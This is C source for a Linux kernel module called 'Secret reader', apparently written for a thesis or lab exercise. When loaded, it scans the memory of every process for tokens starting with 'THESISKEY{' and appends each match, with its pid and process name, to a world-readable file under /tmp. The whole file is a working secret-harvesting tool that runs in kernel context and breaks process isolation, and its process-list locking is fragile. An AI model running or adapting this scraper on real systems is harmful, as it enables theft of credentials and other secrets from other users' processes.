#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Secret reader");

#define OUT_FILE "/tmp/thesis-ipc/secret.txt"
#define SEARCH_STR "THESISKEY{"
#define SEARCH_LEN 10
#define BUF_SIZE (4096)
#define MAX_FOUND 10

static void write_result(const char *data, size_t len) {
    struct file *f;
    loff_t pos = 0;

    f = filp_open(OUT_FILE, O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (IS_ERR(f)) {
        printk(KERN_ERR "secret_reader: cannot open output file\n");
        return;
    }
    kernel_write(f, data, len, &pos);
    filp_close(f, NULL);
}

static void search_vma(struct task_struct *task, struct vm_area_struct *vma) {
    unsigned long addr;
    char *buf;
    char msg[256];
    int found = 0;

    if (!(vma->vm_flags & VM_READ))
        return;

    buf = kmalloc(BUF_SIZE + SEARCH_LEN, GFP_KERNEL);
    if (!buf)
        return;

    for (addr = vma->vm_start; addr < vma->vm_end && found < MAX_FOUND; addr += BUF_SIZE) {
        unsigned long bytes_to_read = min((unsigned long)BUF_SIZE, vma->vm_end - addr);
        unsigned long copied;
        char *p;

        copied = access_process_vm(task, addr, buf, bytes_to_read, 0);
        if (copied == 0)
            continue;

        /* Search for THESISKEY{ in the buffer */
        for (p = buf; p < buf + copied - SEARCH_LEN; p++) {
            if (memcmp(p, SEARCH_STR, SEARCH_LEN) == 0) {
                /* Found it! Extract the full token */
                int token_len = 0;
                char *end;

                /* Find the closing } */
                for (end = p + SEARCH_LEN; end < buf + copied && *end != '}' && token_len < 200; end++) {
                    token_len++;
                }

                if (end < buf + copied && *end == '}') {
                    /* We have a complete token */
                    int full_len = (end - p) + 1;
                    snprintf(msg, sizeof(msg), "FOUND pid=%d comm=%s: ", 
                             task_pid_nr(task), task->comm);
                    write_result(msg, strlen(msg));
                    write_result(p, full_len);
                    write_result("\n", 1);
                    printk(KERN_INFO "secret_reader: Found token in pid %d (%s)\n",
                           task_pid_nr(task), task->comm);
                    found++;
                }
            }
        }
    }

    kfree(buf);
}

static int __init secret_reader_init(void) {
    struct task_struct *task;
    char msg[256];

    printk(KERN_INFO "secret_reader: module loaded, scanning processes\n");

    write_result("=== Secret Reader Started ===\n", 30);

    rcu_read_lock();
    for_each_process(task) {
        struct mm_struct *mm;

        snprintf(msg, sizeof(msg), "Checking pid=%d comm=%s\n",
                 task_pid_nr(task), task->comm);
        write_result(msg, strlen(msg));

        mm = task->mm;
        if (!mm)
            continue;

        if (!mmget_not_zero(mm))
            continue;

        /* Walk VMAs */
        {
            struct vm_area_struct *vma;
            MA_STATE(mas, &mm->mm_mt, 0, 0);

            rcu_read_unlock();
            mmap_read_lock(mm);

            mas_for_each(&mas, vma, ULONG_MAX) {
                search_vma(task, vma);
            }

            mmap_read_unlock(mm);
            mmput(mm);
            rcu_read_lock();
        }
    }
    rcu_read_unlock();

    write_result("=== Secret Reader Done ===\n", 27);
    printk(KERN_INFO "secret_reader: scan complete\n");

    return 0;
}

static void __exit secret_reader_exit(void) {
    printk(KERN_INFO "secret_reader: module unloaded\n");
}

module_init(secret_reader_init);
module_exit(secret_reader_exit);
EOF

